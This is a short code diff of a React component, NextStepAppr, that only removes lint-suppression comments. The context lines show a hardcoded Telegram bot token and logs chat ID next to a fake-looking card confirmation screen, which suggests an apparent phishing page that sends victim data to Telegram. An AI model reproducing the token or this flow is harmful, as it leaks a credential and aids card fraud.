@@ -1,5 +1,4 @@
 import React, { useEffect, useState } from 'react';
-// eslint-disable-next-line no-unused-vars
 import { useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import './NextStepAppr.css';
@@ -8,8 +7,7 @@ const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
 const TELEGRAM_LOGS_CHAT_ID = '-1003861936742';
 
 function NextStepAppr() {
-  // eslint-disable-next-line no-unused-vars
-  // const navigate = useNavigate();
+  //const navigate = useNavigate();
   const [isConfirmed, setIsConfirmed] = useState(false);
   const [currentTime, setCurrentTime] = useState(new Date());
   const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
@@ -69,7 +67,6 @@ function NextStepAppr() {
     setIsConfirmed(true);
   };
 
-  // eslint-disable-next-line no-unused-vars
   const handleCancel = () => {
     window.location.href = '/#/login';
   };
